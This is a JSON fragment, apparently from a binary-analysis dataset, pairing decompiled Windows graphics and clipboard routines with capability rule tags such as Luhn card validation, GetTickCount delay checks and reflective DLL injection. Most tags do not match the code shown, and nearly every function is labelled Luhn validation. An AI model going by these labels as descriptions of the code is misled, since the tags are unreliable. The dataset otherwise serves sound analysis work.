            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042573c(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00403aac();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "0042580c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042580c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x425838;\n    fcn.004030ec();\n    uStack1044 = 0;\n    puStack1048 = 0x42583f;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x425909;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.0042580c::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.0042580c::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.0042580c::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x425910);\n    return;\n}\n",
        "token_count": 475
    },
    "00425c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425c80(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 388
    },
    "0042601c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.0042601c(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "00426118": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426118(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00426034();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 233
    },
    "00426460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00426460(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 127
    },
    "00426508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426508(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.004264b0(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 101
    },
    "004268bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004268bc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 8) = uVar1;\n    fcn.00426968();\n    fcn.00426968();\n    fcn.00426968();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 205
    },
    "00426968": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426968(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x426983;\n    fcn.00419680();\n    uStack32 = 0x4269ac;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00419680();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 138
    },
    "00426bbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426bbc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x426bd8;\n    iVar1 = fcn.004269d0();\n    if (iVar1 == 0) {\n        puStack28 = 0x426be8;\n        fcn.0042518c();\n    }\n    puStack28 = 0x426bef;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStack32 = 0x426c33;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piVar2[7] = in_EAX;\n    puStack28 = &stack0xfffffffc;\n    iVar1 = fcn.00404854();\n    piVar2[6] = iVar1;\n    (**(*piVar2 + 0x5c))();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x426c52;\n    fcn.00404640();\n    *(in_EAX + 0xc) = piVar2;\n    piVar2[5] = in_EAX;\n    uStack32 = 0x426c66;\n    iVar1 = fcn.00404854();\n    piVar2[4] = iVar1;\n    uStack32 = 0x426c76;\n    fcn.0040483c();\n    return;\n}\n",
        "token_count": 376
    },
    "00426f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426f88(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x426eb4;\n    fcn.00426f0c(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "004273f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004273f4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x427408;\n    fcn.00427360();\n    puStack124 = 0x427417;\n    fcn.0041b880();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x427425;\n        fcn.004251bc();\n    }\n    puStack124 = 0x42742d;\n    uVar2 = fcn.00402ef0();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x4274b4;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004030ec();\n    fcn.0041b880();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.004251bc();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x4274bb;\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 468
    },
    "00427644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00427644(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x4276ed;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x4276cb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0040a63c();\n    fcn.0040e878();\n    fcn.00405894();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.00426738();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 300
    },
    "00427bc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00427bc4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.0042518c();\n    }\n    fcn.00427360();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 321
    },
    "00427eec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427eec(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.0042497c();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "004281ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004281ac(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x4281e2;\n        var_4h = param_2;\n        iVar1 = fcn.00425a60();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x4281ef;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x4281fb;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x428208;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x42825b;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.004281ac::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x428262);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "00428c2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428c2c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x428c4a;\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x428d1f;\n            fcn.00419d80();\n            return;\n        }\n    }\n    uStack104 = 0x428c5a;\n    fcn.004293f8();\n    uStack104 = 0x497a14;\n    puStack108 = 0x428c64;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x428cee;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403aac();\n        in_stack_ffffff80 = 0;\n        fcn.00429668(0, 0, &fcn.00428c2c::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.004280e0();\n        fcn.004280e4();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x497a14, 0x428cf5);\n    return;\n}\n",
        "token_count": 503
    },
    "00428d28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428d28(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.00428d28::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x428d4d;\n    fcn.004293f8();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x428db8;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x4979f8) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.00428918();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.004282b4(*(in_EAX + 0x2c), &fcn.00428d28::var_5ch);\n    uVar3 = 0;\n    fcn.00429668(0, *(*(in_EAX + 0x28) + 0x70), &fcn.00428d28::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 431
    },
    "00428de8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428de8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.004290dc();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040f8b8();\n    return;\n}\n",
        "token_count": 93
    },
    "00428e18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00428e18(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00404610();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041b6d8(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.004293f8();\n    fcn.0040f8b8();\n    fcn.00429668(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 265
    },
    "004292cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004292cc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.00428de8();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.00425174();\n    }\n    fcn.00429384();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.00425454();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 211
    },
    "00429d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429d00(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.004293f8();\n    if (param_1 == 0) {\n        fcn.00403aac();\n        fcn.00429668(0, 0, auStack98);\n    }\n    else {\n        fcn.0041b880();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.004251a4();\n        }\n        fcn.00429790(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0042a528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a528(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.00429408();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042a528::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42a575;\n    uVar1 = fcn.004282b4(*(in_EAX + 0x2c), &fcn.0042a528::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42a5a2;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.00428918();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 406
    },
    "0042a674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042a674(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00426460();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.004280e0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 190
    },
    "0042a91c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042a91c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42a935;\n    piVar1 = fcn.00404610();\n    uStack36 = 0x42a9aa;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041b654(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041b880();\n    fcn.0041b880();\n    if (1 < var_ah._2_2_) {\n        fcn.004251b0();\n    }\n    fcn.0042a9d4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42a9ca;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 304
    },
    "0042aa48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aa48(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint lpvObject;\n    uint var_2ch;\n    uint piconinfo;\n    uint var_ch;\n    uint hgdiobj;\n    int32_t *var_4h;\n    \n    puStack60 = 0x42aa60;\n    var_4h = in_EAX;\n    fcn.0042a9d4();\n    if (param_2 != 0) {\n        puStack60 = &fcn.0042aa48::piconinfo;\n        puStack68 = 0x42aa6e;\n        iStack64 = param_2;\n        iVar1 = sub.user32.dll_GetIconInfo();\n        if (iVar1 != 0) {\n            uStack72 = 0x42aac5;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            uVar2 = hgdiobj;\n            puStack68 = &stack0xfffffffc;\n            iVar1 = sub.gdi32.dll_GetObjectA(hgdiobj, 0x18, &fcn.0042aa48::lpvObject);\n            if (iVar1 != 0) {\n                iVar1 = var_4h[10];\n                *(iVar1 + 0x10) = var_2ch;\n                *(iVar1 + 0x14) = var_2ch;\n            }\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_DeleteObject(var_ch, 0x42aacc);\n            sub.gdi32.dll_DeleteObject(hgdiobj);\n            return;\n        }\n    }\n    puStack68 = 0x42aad7;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 455
    },
    "0042abe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042abe4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42abf2;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x497a0c;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 221
    },
    "0042ae04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ae04(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "0042ae68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042ae68(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "0042ae74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
